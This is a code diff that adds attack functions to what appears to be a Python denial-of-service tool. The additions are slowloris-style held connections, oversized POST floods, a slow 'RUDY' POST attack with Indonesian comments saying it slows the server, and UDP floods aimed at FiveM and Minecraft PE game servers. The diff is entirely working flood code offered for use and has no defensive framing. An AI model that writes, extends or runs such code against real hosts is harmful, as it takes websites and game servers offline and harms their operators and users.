@@ -398,7 +398,89 @@ def AttackCFB(url, until_datetime, scraper):
             scraper.get(url, timeout=15)
         except:
             pass
+
+def LaunchSLOW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Cache-Control": "no-cache",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "*/*",
+        "Connection": "keep-alive"
+    }
+    
+    while (until - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target['host'], int(target['port'])))
             
+            s.send(f"GET {target['uri']} HTTP/1.1\r\n".encode("utf-8"))
+            for header, value in headers.items():
+                s.send(f"{header}: {value}\r\n".encode("utf-8"))
+            s.send("\r\n".encode("utf-8"))
+            
+            time.sleep(1)
+            s.close()
+        except:
+            pass
+
+def LaunchMBP(url, th, t, payload_size_mb):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    payload = b"A" * (int(payload_size_mb) * 1024 * 1024)  # Convert MB to bytes
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Content-Length": str(len(payload)),
+        "Connection": "keep-alive"
+    }
+    
+    while (until - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target['host'], int(target['port'])))
+            
+            s.send(f"POST {target['uri']} HTTP/1.1\r\n".encode("utf-8"))
+            for header, value in headers.items():
+                s.send(f"{header}: {value}\r\n".encode("utf-8"))
+            s.send("\r\n".encode("utf-8"))
+            s.send(payload)
+            
+            s.close()
+        except:
+            pass
+
+def LaunchRUDY(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Content-Length": "100000000",  # Content-Length diatur besar untuk memperlambat server
+        "Connection": "keep-alive"
+    }
+    
+    while (until - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target['host'], int(target['port'])))
+            
+            s.send(f"POST {target['uri']} HTTP/1.1\r\n".encode("utf-8"))
+            for header, value in headers.items():
+                s.send(f"{header}: {value}\r\n".encode("utf-8"))
+            s.send("\r\n".encode("utf-8"))
+            
+            # Kirim data perlahan-lahan untuk memperlambat server
+            while (until - datetime.datetime.now()).total_seconds() > 0:
+                s.send("a".encode("utf-8"))
+                time.sleep(1)  # Jeda 1 detik antara pengiriman karakter
+                
+            s.close()
+        except:
+            pass
+            
+
 #Layer4
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -441,3 +523,42 @@ def sender(host, port, until_datetime, payload):
         except:
             sock.close()
             pass
+
+def LaunchFIVEM(target_ip, target_port, thread_count, duration):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
+    for _ in range(int(thread_count)):
+        try:
+            thd = threading.Thread(target=fivem_server_attack, args=(target_ip, target_port, until))
+            thd.start()
+        except:
+            pass
+
+def fivem_server_attack(target_ip, target_port, until_datetime):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = bytearray([0xFF, 0xFF, 0xFF, 0xFF, 0x54])
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload, (target_ip, int(target_port)))
+        except:
+            sock.close()
+            pass
+
+def LaunchMCPE(target_ip, target_port, thread_count, duration):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
+    for _ in range(int(thread_count)):
+        try:
+            thd = threading.Thread(target=minecraft_pe_server_attack, args=(target_ip, target_port, until))
+            thd.start()
+        except:
+            pass
+            
+def minecraft_pe_server_attack(target_ip, target_port, until_datetime):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload * (1024 * 1024), (target_ip, target_port))
+        except:
+            pass
+
